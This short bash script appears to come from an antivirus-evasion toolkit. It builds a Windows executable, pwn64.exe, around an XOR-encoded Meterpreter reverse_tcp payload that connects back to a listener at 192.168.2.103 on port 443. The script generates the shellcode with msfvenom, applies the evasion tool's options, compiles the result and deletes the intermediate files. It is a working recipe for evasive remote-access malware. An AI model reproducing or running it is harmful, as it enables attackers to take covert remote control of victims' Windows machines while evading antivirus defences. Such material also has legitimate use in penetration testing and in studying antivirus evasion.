#!/bin/bash          
# example script for building executables with 64bit payload
. build/global_win64.sh
# make meterpreter reverse payload
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.2.103 -e x64/xor lport=443 -f c --platform Windows > sc.txt
./make_avet -f sc.txt -F -X
$win64_compiler -o pwn64.exe avet.c
# cleanup
rm sc.txt && echo "" > defs.h
